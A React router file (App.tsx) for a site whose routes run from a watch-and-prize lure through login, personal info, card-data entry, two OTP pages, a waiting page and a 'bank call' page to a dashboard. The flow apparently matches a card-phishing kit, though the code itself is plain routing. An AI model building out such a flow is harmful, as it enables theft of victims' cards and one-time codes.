import { useEffect } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Route, Routes, useLocation } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import Index from "./pages/Index.tsx";
import Dashboard from "./pages/Dashboard.tsx";
import Watches from "./pages/Watches.tsx";
import WatchDetails from "./pages/WatchDetails.tsx";
import Login from "./pages/Login.tsx";
import PersonalInfo from "./pages/PersonalInfo.tsx";
import OTP from "./pages/OTP.tsx";
import OTP2 from "./pages/OTP2.tsx";
import CardData from "./pages/CardData.tsx";

import Success from "./pages/Success.tsx";

import ConfirmOrder from "./pages/ConfirmOrder.tsx";
import Waiting from "./pages/Waiting.tsx";
import BankCall from "./pages/BankCall.tsx";
import ActivationData from "./pages/ActivationData.tsx";
import PrizeDetails from "./pages/PrizeDetails.tsx";
import PrizeItemDetails from "./pages/PrizeItemDetails.tsx";
import NotFound from "./pages/NotFound.tsx";
import PageTransition from "./components/PageTransition.tsx";

const ScrollToTop = () => {
  const { pathname } = useLocation();
  useEffect(() => { window.scrollTo(0, 0); }, [pathname]);
  return null;
};

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <ScrollToTop />
        <PageTransition>
          <Routes>
            <Route path="/" element={<Index />} />
            <Route path="/watches" element={<Watches />} />
            <Route path="/watches/:id" element={<WatchDetails />} />
            <Route path="/login" element={<Login />} />
            <Route path="/personal-info" element={<PersonalInfo />} />
            <Route path="/otp" element={<OTP />} />
            <Route path="/otp2" element={<OTP2 />} />
            
            <Route path="/card-data" element={<CardData />} />
            <Route path="/success" element={<Success />} />
            
            <Route path="/confirm-order" element={<ConfirmOrder />} />
            <Route path="/activation-data" element={<ActivationData />} />
            <Route path="/waiting" element={<Waiting />} />
            <Route path="/bank-call" element={<BankCall />} />
            <Route path="/dashboard" element={<Dashboard />} />
            <Route path="/prizes/:category" element={<PrizeDetails />} />
            <Route path="/prizes/:category/:prizeId" element={<PrizeItemDetails />} />
            {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
            <Route path="*" element={<NotFound />} />
          </Routes>
        </PageTransition>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
